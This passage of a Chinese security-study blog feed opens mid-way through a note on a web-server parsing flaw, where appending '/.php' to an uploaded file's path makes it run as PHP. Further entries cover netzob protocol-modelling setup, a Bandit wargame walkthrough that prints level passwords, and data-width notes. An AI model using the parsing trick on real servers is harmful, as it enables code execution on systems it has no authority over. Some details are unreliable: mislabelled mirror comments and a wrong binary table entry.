遇到文件路径“&#x2F;1.aaa&#x2F;2.bbb&#x2F;3.cccc”文件时，若<br>“&#x2F;1.aaa&#x2F;2.bbb&#x2F;3.cccc”不存在，则会去掉最后的”&#x2F;3.ccc”,然后判断“&#x2F;1.aaa&#x2F;2.bbb”是否<br>存在，若不存在，则继续去掉“&#x2F;2.bbb”,以此类推</p><p>构造poc<br><img src="https://i.imgur.com/M5eTRFU.png"></p><p><img src="https://i.imgur.com/DsZ2bAi.gif"></p><p>访问路径，在末尾加上<code>/.php</code>,将其作为php解析<br><img src="https://i.imgur.com/WMkEN03.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netzob相关</title>
      <link href="/2024/12/14/%E5%8D%8F%E8%AE%AE%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%9D%E8%AF%95/"/>
      <url>/2024/12/14/%E5%8D%8F%E8%AE%AE%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>主要的netzob的安装和使用之类的</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="1-Ubuntu的安装"><a href="#1-Ubuntu的安装" class="headerlink" title="1. Ubuntu的安装"></a>1. Ubuntu的安装</h3><p><img src="https://i.imgur.com/gBKAB98.jpeg"></p><p>到官网下载iso文件，到vm中以该文件新建Ubuntu的虚拟机</p><p><img src="https://i.imgur.com/GLDuiih.jpeg"></p><p>设定完账号密码后进入</p><h3 id="2-Anaconda介绍"><a href="#2-Anaconda介绍" class="headerlink" title="2 Anaconda介绍"></a><strong>2 Anaconda介绍</strong></h3><p>Anaconda 是一个开源的 Python 和 R 编程语言的分发版，主要用于数据科学、机器学习、人工智能、深度学习等领域的开发和管理。它集成了大量的开源工具和库，帮助用户在处理复杂的数据分析和科学计算时更加高效和便捷。</p><p>Anaconda 的核心优势在于其强大的包管理和环境管理功能。它不仅为用户提供了 Python 和 R 的核心库，还包括了用于数据处理、分析、可视化以及机器学习的众多科学计算库，如 NumPy、Pandas、SciPy、Matplotlib、Seaborn、TensorFlow、PyTorch 等。此外，Anaconda 还自带了 Jupyter Notebook、Spyder 等 IDE（集成开发环境），方便用户进行交互式编程和数据分析。</p><h3 id="3-Anaconda及netzob搭建"><a href="#3-Anaconda及netzob搭建" class="headerlink" title="3 Anaconda及netzob搭建"></a><strong>3 Anaconda及netzob搭建</strong></h3><p>安装参考：<a href="https://blog.csdn.net/KRISNAT/article/details/124041869">超详细Ubuntu安装Anaconda步骤+Anconda常用命令_ubuntu 安装anaconda-CSDN博客</a></p><p>对Anaconda进行安装并配置安装netzob</p><p><img src="https://i.imgur.com/Y5Puw3k.jpeg"></p><p>到官网下载安装的sh文件，移动到下载目录打开命令行执行</p><p>bash Anaconda3-2024.10-1-Linux-x86_64.sh</p><p>进行安装</p><p><img src="https://i.imgur.com/DRj07k1.jpeg"></p><p>安装完成后进行验证安装，<br>此处可能需要修改环境变量才能生效</p><ol><li>安装在当前用户目录下的情况只需要将Anconda3的安装地址添加进PATH即可。首先打开<code>~/.bashrc</code>，然后在将<code>export PATH=$PATH:/home/USERNAME/anaconda3/bin</code>添加到末尾，最后更新一下<code>~/.bashrc</code>。依次执行下面代码。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit ~/.bashrc</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>添加内容【注意这里的<code>USERNAME</code>需要切换成自己的用户名】：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export  PATH=$PATH:/home/USERNAME/anaconda3/bin</span><br></pre></td></tr></table></figure><p>确认后重启命令行，创建python版本为3.8.10，名为netzob的虚拟环境</p><p><img src="https://i.imgur.com/ICYPq6y.jpeg"></p><p>启动netzob环境并使用命令安装依赖项,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y python3 python3-dev python3-setuptools virtualenv build-essential libpcap-dev libgraph-easy-perl libffi-dev</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/IdRVNSm.jpeg"></p><p>这段代码是用于在基于 Debian 或 Ubuntu 的系统上安装一系列软件包的命令。每个包的作用如下：</p><table><thead><tr><th>python3</th><th>安装 Python 3 版本的解释器。</th></tr></thead><tbody><tr><td>python3-dev</td><td>安装 Python 3 的开发头文件和静态库，通常用于编译和安装需要与 Python 进行扩展的 C&#x2F;C++ 库。</td></tr><tr><td>python3-setuptools</td><td>安装 setuptools，一个 Python 包管理工具，用于构建和发布 Python 包。</td></tr><tr><td>virtualenv</td><td>安装 virtualenv，一个用于创建 Python 虚拟环境的工具，可以使不同项目之间的 Python 包依赖隔离开来。</td></tr><tr><td>build-essential</td><td>安装编译 C&#x2F;C++ 程序所需的工具链（如 GCC 编译器和相关库）。</td></tr><tr><td>libpcap-dev</td><td>安装用于网络数据包捕获的开发库，通常用于开发网络相关应用或工具。</td></tr><tr><td>libgraph-easy-perl</td><td>安装一个用于创建图形和图表的 Perl 库。</td></tr><tr><td>libffi-dev</td><td>安装用于支持外部函数接口（FFI）的开发库，通常用于通过 C 语言与其他语言（如 Python）进行交互。</td></tr></tbody></table><p>然后对conda的镜像源进行配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line"># 清华大学的 Anaconda Free 软件包镜像源。</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line"># 清华大学的 Anaconda Main 软件包镜像源。</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line"># 清华大学的 Bioconda 镜像源，这是一个专注于生物学领域的软件包集合。</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/</span><br><span class="line"># 清华大学的 Conda-Forge 镜像源，这是一个专注于生物学领域的软件包集合。</span><br><span class="line">conda config --add channels bioconda</span><br><span class="line"># 官方的 Bioconda 镜像源。</span><br><span class="line">conda config --add channels conda-forge</span><br><span class="line"># 官方的 Conda-Forge 镜像源。</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/o9tpByO.jpeg"></p><p>最后执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install netzob</span><br></pre></td></tr></table></figure><p>使用pip安装netzob,安装过程中可能会市场报错在某一个安装包的安装上中断下载，这之后注意所中断的安装包名，然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install [安装包名]</span><br></pre></td></tr></table></figure><p>进行单独安装，再继续执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install netzob</span><br></pre></td></tr></table></figure><p>完成netzob的安装<br><img src="https://i.imgur.com/dp8PBz6.jpeg"></p><p>安装完成后可以直接进入netzob的命令行</p><p><img src="https://i.imgur.com/1GzdGtr.jpeg"></p><h3 id="4-pycharm的安装"><a href="#4-pycharm的安装" class="headerlink" title="4 pycharm的安装"></a><strong>4 pycharm的安装</strong></h3><p>PyCharm 是由 JetBrains 开发的一个流行的 Python 集成开发环境（IDE），用于 Python 编程。它提供了一整套工具和功能，旨在提高 Python 开发的效率和质量。</p><p><img src="https://i.imgur.com/Fyqu9Ti.jpeg"></p><p>进入官网下载社区版本，到命令行执行程序</p><p><img src="https://i.imgur.com/yUS6DZt.jpeg"></p><p>选用自定义环境并确定为先前配置好的netzob环境</p><p><img src="https://i.imgur.com/tSNNMxz.jpeg"></p><p>新建任意python测试模块是否成功导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:  </span><br><span class="line"><span class="keyword">from</span> netzob.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;netzob.all 模块已成功导入&quot;</span>)  </span><br><span class="line"><span class="keyword">except</span> ImportError <span class="keyword">as</span> e:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;导入失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)  </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/IoFNmqP.jpeg"></p><p>到这里完成了netzob的环境搭建</p><h2 id="netzob的使用"><a href="#netzob的使用" class="headerlink" title="netzob的使用"></a>netzob的使用</h2><p>使用文档参考-1：<br><a href="https://netzob.github.io/netzob/index.html">Netzob documentation — Netzob Documentation</a><br>使用文档参考-2：<br><a href="https://netzob.readthedocs.io/en/latest/tutorials/discover_features.html">Discover features of Netzob — Netzob 1.0~git documentation</a><br>使用文档参考-3：<br><a href="https://netzob.org/resources#Academic-Publications">Netzob : NETwork protocol modeliZatiOn By reverse engineering</a></p><p>讲在开头：<br>就netzob这个程序而言，似乎还没有完成，可以再python库中看到这样的内容（已翻译)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-                          coding: utf-8                                -*-</span></span><br><span class="line"><span class="comment">#+---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">#|          01001110 01100101 01110100 01111010 01101111 01100010            |</span></span><br><span class="line"><span class="comment">#|                                                                           |</span></span><br><span class="line"><span class="comment">#|                         Netzob：推断通信协议                                |</span></span><br><span class="line"><span class="comment">#+---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">#| 版权所有 (C) 2011-2017 Georges Bossert 和 Frédéric Guihéry                 |</span></span><br><span class="line"><span class="comment">#| 本程序是免费软件：您可以根据由                                                |</span></span><br><span class="line"><span class="comment">#| 自由软件基金会发布的 GNU 通用公共许可证条款重新分发和/或修改它，无论是许可证第     |</span></span><br><span class="line"><span class="comment">#| 3 版，还是（根据您的选择）任何更高版本。                                       |</span></span><br><span class="line"><span class="comment">#|                                                                           |</span></span><br><span class="line"><span class="comment">#| 本程序分发时希望它有用，                                                     |</span></span><br><span class="line"><span class="comment">#| 但不附带任何担保；甚至没有关于                                                |</span></span><br><span class="line"><span class="comment">#| 适销性或特定用途适用性的默示担保。有关更多详细信息，请参阅                       |</span></span><br><span class="line"><span class="comment">#| GNU 通用公共许可证。                                                        |</span></span><br><span class="line"><span class="comment">#|                                                                           |</span></span><br><span class="line"><span class="comment">#| 您应该已随本程序收到一份 GNU 通用公共许可证的副本。如果没有，请参阅 &lt;http://www.gnu.org/licenses/&gt;。|</span></span><br><span class="line"><span class="comment">#+---------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">#| @url : http://www.netzob.org                                               |</span></span><br><span class="line"><span class="comment">#| @contact : contact@netzob.org                                              |</span></span><br><span class="line"><span class="comment">#| @sponsors : Amossys，http://www.amossys.fr                                 |</span></span><br><span class="line"><span class="comment">#| Supélec，http://www.rennes.supelec.fr/ren/rd/cidre/                        |</span></span><br><span class="line"><span class="comment">#+----------------------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure><p>注意！！！重点是中间那句……本程序分发时希望它有用…..离谱玩意儿<br>当然啦，就实验而言，其中的所有变量都是可以正常使用的….但多少有一些问题，如果有时间的话我会试着说明一下</p><p>接下来参照<a href="https://netzob.github.io/netzob/tutorials/discover_features.html#discover-features">发现 Netzob 的功能 — Netzob Documentation — 发现 Netzob 的功能 — Netzob Documentation</a><br>来讲述</p><p> 所描述的功能包括以下功能：</p><ol><li>协议建模</li><li>协议推理<ul><li>格式推理<ul><li>按照特定分隔符对消息进行分区</li><li>按照特定键字段对消息进行重新分组</li><li>在序列排序后对每条消息进行子集的分区</li><li>在每组消息中搜索关系</li><li>修改消息格式以应用找到的关系</li></ul></li><li>语法推理<ul><li>根据捕获的消息序列生成具有一个主状态的自动机</li><li>根据捕获的消息序列生成具有状态序列的自动机</li><li>根据捕获的消息序列生成前缀树受体 （PTA） 自动机</li></ul></li></ul></li><li>流量生成<ul><li>按照每个组的推断消息格式并通过访问推断的自动机生成消息</li></ul></li><li>模糊测试<ul><li>通过生成更改的消息格式对实现进行模糊测试</li></ul></li></ol><p>可能由于时间问题，文档实际上这里给出来的示例流量包其实已经下载不了了</p><p><img src="https://i.imgur.com/Ug2vVXn.png"><br>所以后续关于toy协议的示例，也就是&#x3D;&#x3D;格式推理&#x3D;&#x3D;部分的内容实际上都时没办法实践的内容,不过看看就好啊</p><p>这里从协议建模开始吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求方法：GET 或 POST 等  </span></span><br><span class="line">http_method = Field([<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;HEAD&quot;</span>], <span class="string">&quot;请求方法&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 请求的URL（可以是任意URL，这里用的是一个简单的URL）  </span></span><br><span class="line">http_url = Field(Raw(nbBytes=(<span class="number">1</span>, <span class="number">255</span>)), <span class="string">&quot;http.url&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP协议版本：HTTP/1.1 或 HTTP/2 等  </span></span><br><span class="line">http_version = Field([<span class="string">&quot;HTTP/1.0&quot;</span>, <span class="string">&quot;HTTP/1.1&quot;</span>, <span class="string">&quot;HTTP/2&quot;</span>], <span class="string">&quot;HTTP协议版本&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求头字段：User-Agent  </span></span><br><span class="line">http_user_agent = Field(Raw(nbBytes=(<span class="number">1</span>, <span class="number">255</span>)), <span class="string">&quot;请求头字段User-Agent&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 请求头字段：Host  </span></span><br><span class="line">http_host = Field(Raw(nbBytes=(<span class="number">1</span>, <span class="number">255</span>)), <span class="string">&quot;请求头字段Host&quot;</span>)  </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 请求头字段：Accept  </span></span><br><span class="line">http_accept = Field(Raw(nbBytes=(<span class="number">1</span>, <span class="number">255</span>)), <span class="string">&quot;请求头字段Accept&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求头字段：Connection  </span></span><br><span class="line">http_connection = Field([<span class="string">&quot;keep-alive&quot;</span>, <span class="string">&quot;close&quot;</span>], <span class="string">&quot;请求头字段Connection&quot;</span>)  </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 请求头字段：Referer  </span></span><br><span class="line">http_referer = Field(Raw(nbBytes=(<span class="number">1</span>, <span class="number">255</span>)), <span class="string">&quot;请求头字段Referer&quot;</span>)  </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 空行，用于分隔头部和主体  </span></span><br><span class="line">http_crlf = Field(<span class="string">&quot;\\r\\n&quot;</span>, <span class="string">&quot;空行&quot;</span>)  </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 请求体（对于POST请求，可能会有内容）  </span></span><br><span class="line">http_body = Field(Raw(nbBytes=(<span class="number">0</span>, <span class="number">1024</span>)), <span class="string">&quot;请求体&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义整个HTTP请求格式，按顺序组合各个字段  </span></span><br><span class="line">http_request = Symbol(name=<span class="string">&quot;http_request&quot;</span>,  </span><br><span class="line">                     fields=[http_method,  </span><br><span class="line">                              http_url,  </span><br><span class="line">                              http_version,  </span><br><span class="line">                              http_crlf,   <span class="comment"># 请求头部分隔符  </span></span><br><span class="line">                              http_host,  </span><br><span class="line">                              http_user_agent,  </span><br><span class="line">                              http_accept,    </span><br><span class="line">                              http_connection,  </span><br><span class="line">                              http_referer,  </span><br><span class="line">                              http_crlf,   <span class="comment"># 请求头部分隔符  </span></span><br><span class="line">                              http_body])   <span class="comment"># 请求体（可选）  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 打印请求的结构  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HTTP 请求包结构:&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(http_request.str_structure())  </span><br></pre></td></tr></table></figure><p>输出的模型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">HTTP 请求包结构:  </span><br><span class="line">http_request  </span><br><span class="line">|--  请求方法  </span><br><span class="line">     |--   Alt  </span><br><span class="line">           |--   Data (String(&#x27;GET&#x27;))  </span><br><span class="line">           |--   Data (String(&#x27;POST&#x27;))  </span><br><span class="line">           |--   Data (String(&#x27;PUT&#x27;))  </span><br><span class="line">           |--   Data (String(&#x27;DELETE&#x27;))  </span><br><span class="line">           |--   Data (String(&#x27;HEAD&#x27;))  </span><br><span class="line">|--  http.url  </span><br><span class="line">     |--   Data (Raw(nbBytes=(1,255)))  </span><br><span class="line">|--  HTTP协议版本  </span><br><span class="line">     |--   Alt  </span><br><span class="line">           |--   Data (String(&#x27;HTTP/1.0&#x27;))  </span><br><span class="line">           |--   Data (String(&#x27;HTTP/1.1&#x27;))  </span><br><span class="line">           |--   Data (String(&#x27;HTTP/2&#x27;))  </span><br><span class="line">|--  空行  </span><br><span class="line">     |--   Data (String(&#x27;\r\n&#x27;))  </span><br><span class="line">|--  请求头字段Host  </span><br><span class="line">     |--   Data (Raw(nbBytes=(1,255)))  </span><br><span class="line">|--  请求头字段User-Agent  </span><br><span class="line">     |--   Data (Raw(nbBytes=(1,255)))  </span><br><span class="line">|--  请求头字段Accept  </span><br><span class="line">     |--   Data (Raw(nbBytes=(1,255)))  </span><br><span class="line">|--  请求头字段Connection  </span><br><span class="line">     |--   Alt  </span><br><span class="line">           |--   Data (String(&#x27;keep-alive&#x27;))  </span><br><span class="line">           |--   Data (String(&#x27;close&#x27;))  </span><br><span class="line">|--  请求头字段Referer  </span><br><span class="line">     |--   Data (Raw(nbBytes=(1,255)))  </span><br><span class="line">|--  空行  </span><br><span class="line">     |--   Data (String(&#x27;\r\n&#x27;))  </span><br><span class="line">|--  请求体  </span><br><span class="line">     |--   Data (Raw(nbBytes=(0,1024)))  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wargames靶场练习</title>
      <link href="/2024/11/06/%E9%97%B2%E6%9A%87/"/>
      <url>/2024/11/06/%E9%97%B2%E6%9A%87/</url>
      
        <content type="html"><![CDATA[<h3 id="Wargames"><a href="#Wargames" class="headerlink" title="Wargames"></a>Wargames</h3><p>力推，内容丰富，因吹斯听，说它是一个<a href="https://cloud.tencent.com/product/ns?from_column=20065&from=20065">网络安全</a>百科全书也不为过。</p><p>不会没关系，一个字，学！</p><p>特色的闯关模式让你情不自禁的学习，知识涵盖 Linux 命令、web 安全、密码学、系统安全、逆向、<a href="https://cloud.tencent.com/product/ca?from_column=20065&from=20065">代码审计</a>等等。</p><p>传送门：<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://overthewire.org/wargames/&objectId=1976389&objectType=1">https://overthewire.org/wargames/</a></p><h1 id="Bandit模块"><a href="#Bandit模块" class="headerlink" title="Bandit模块"></a>Bandit模块</h1><h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><p>此级别的目标是让您使用 SSH 登录游戏。您需要连接的主机是 <strong>bandit.labs.overthewire.org</strong>，位于端口 2220 上。用户名是 <strong>bandit0</strong>，密码是 <strong>bandit0</strong>。登录后，转到 <a href="https://overthewire.org/wargames/bandit/bandit1.html">Level 1</a> 页面以了解如何通过 Level 1。</p><h3 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h3><p>直接连接到就可以了，这里使用的工具MobaXterm</p><h2 id="level0-level-1"><a href="#level0-level-1" class="headerlink" title="level0-&gt;level 1"></a>level0-&gt;level 1</h2><p><img src="/../img/Pasted%20image%2020241106203944.png"></p><p>使用level 0中账户里面的readme文件中的密码登录用户bandit 1</p><!--⚠️Imgur upload failed, check dev console--><p><img src="/../img/Pasted%20image%2020241108230326.png"></p><h2 id="level1-level-2"><a href="#level1-level-2" class="headerlink" title="level1-&gt;level 2"></a>level1-&gt;level 2</h2><p>目标：打开bandit中名为<code>-</code>的文件</p><p>涉及命令：</p><ul><li>ls - 列出目录内容</li><li>cat - 连接文件并在标准输出上打印</li><li><strong>file</strong> — 确定文件类型</li><li>du - 估计文件空间使用情况</li><li>find - 在目录层次结构中搜索文件</li></ul><p>难点：<br>cat读取的使用是将文件(file)连接到标准输出。如果没有 FILE，或者当 FILE 为 - 时，读取标准输入。此处文件名为<code>-</code>,所以无法正常读取</p><p><img src="https://i.imgur.com/qK5fGqF.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">du -a</span><br><span class="line"></span><br><span class="line">读取所有文件的写入计数，而不仅仅是目录</span><br><span class="line"></span><br><span class="line">cat ./-</span><br><span class="line"></span><br><span class="line">查看指令路径文件</span><br></pre></td></tr></table></figure><p>获取到bandit2主机的密码为<br>263JGJPfgU6LtdEvgfWU1XP5yac29mFx</p><p>成功登录<br><img src="https://i.imgur.com/WXP3RX1.png"></p><h2 id="level2-level-3"><a href="#level2-level-3" class="headerlink" title="level2-&gt;level 3"></a>level2-&gt;level 3</h2><p>目标：下一级的密码存储在主目录中名为spaces in this filename的文件中</p><p>难点：空格会将字符串分割为指令，导致原字符串spaces in this filename无法完整输入</p><p><img src="https://i.imgur.com/rOZFarg.png"></p><p>解决方法：</p><ol><li><p>添加反斜杠<code>\</code>和<code>空格</code>：<code>cat ./spacrs\ in\ this\ filename</code><br><img src="https://i.imgur.com/TdnZ37J.png"></p></li><li><p>添加双引号包裹字符串<br><img src="https://i.imgur.com/pJfRVs2.png"></p></li></ol><p>获得密码：MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx<br><img src="https://i.imgur.com/qTlNxYk.png"></p><h2 id="level3-level-4"><a href="#level3-level-4" class="headerlink" title="level3-&gt;level 4"></a>level3-&gt;level 4</h2><p>目标：下一级的密码存储在 <strong>inhere</strong> 目录中的隐藏文件中。</p><p>难点：</p><p>嗯。。似乎就是ls没法显示隐藏文件，但是du命令可以显示来着。。。</p><p>所以。。获得密码 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ</p><p><img src="https://i.imgur.com/p6xyYvA.png"></p><p>登录进入用户bandit4<br><img src="https://i.imgur.com/uC3QHuS.png"></p><h2 id="level4-level5"><a href="#level4-level5" class="headerlink" title="level4-&gt;level5"></a>level4-&gt;level5</h2><p>目标：下一级的密码存储在 <strong>inhere</strong> 目录中唯一可读的文件中。<br>提示： 如果您的终端搞砸了，请尝试 “reset” 命令。</p><p>试着用<code>ls -l</code>瞅了眼权限啥的，这看上去都一样的啊。。<br><img src="https://i.imgur.com/3TFfo2g.png"></p><p>大抵读了下文件路径啥的？然后读取了下<br><img src="https://i.imgur.com/PIi1ovB.png"><br>变乱码了。。</p><p>然后好像也没瞧见什么法子，反正就一个读取了<br><img src="https://i.imgur.com/djq2oTf.png"></p><p>获取到密码4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw</p><h2 id="level5-level6"><a href="#level5-level6" class="headerlink" title="level5-&gt;level6"></a>level5-&gt;level6</h2><p>目标：下一级的密码存储在 <strong>inhere</strong> 目录下某个位置的文件中，并具有以下所有属性</p><ul><li>人类可读</li><li>大小为 1033 字节</li><li>不可执行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ../maybehere07;ls -l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd ../maybehere05;cat ./-file2;cat ./&quot;spaces file2&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>18的<code>-file2</code>:eKqR22ODhv7SlpxkAEJXSL7s8KT9EaaM3saDwVnXMajkCQfGuDjJZjKtBPMWAZGsDntoXUTxPLh9</p><p>15的<code>spaces file2</code>:Q2z7VXYuHnMJ11Ks9drvakV3s0pADkcPDQl1TlRMMdSzzHJQzX</p>]]></content>
      
      
      <categories>
          
          <category> 范式阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据宽度相关</title>
      <link href="/2024/10/25/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6/"/>
      <url>/2024/10/25/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<ol><li>数学上的数字是没有大小限制的，但计算机的存储是有大小限制的，因此，由于受硬件限制，数据存在长度限制，而且超过一定宽度的数据会被丢弃。</li></ol><p>常见的表示为4位的宽度表示</p><table><thead><tr><th>二进制数</th><th>0000</th><th>0001</th><th>0011</th><th>0011</th><th>0100</th><th>0101</th><th>0110</th><th>0111</th><th>1000</th><th>1001</th><th>1010</th><th>1011</th><th>1100</th><th>1101</th><th>1110</th><th>1111</th></tr></thead><tbody><tr><td>十六进制</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td></tr></tbody></table><p>无符号数：</p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead></table><p>纸面上记录的话逢16进一，但计算机的话由于宽度不够，所以超过16的数直接记为0</p><p>有符号数：</p><table><thead><tr><th>存储正数</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody><tr><td>存储负数</td><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>9</td><td>8</td></tr><tr><td></td><td>-1</td><td>-2</td><td>-3</td><td>-4</td><td>-5</td><td>-6</td><td>-7</td><td>-8</td></tr></tbody></table><p>7的二进制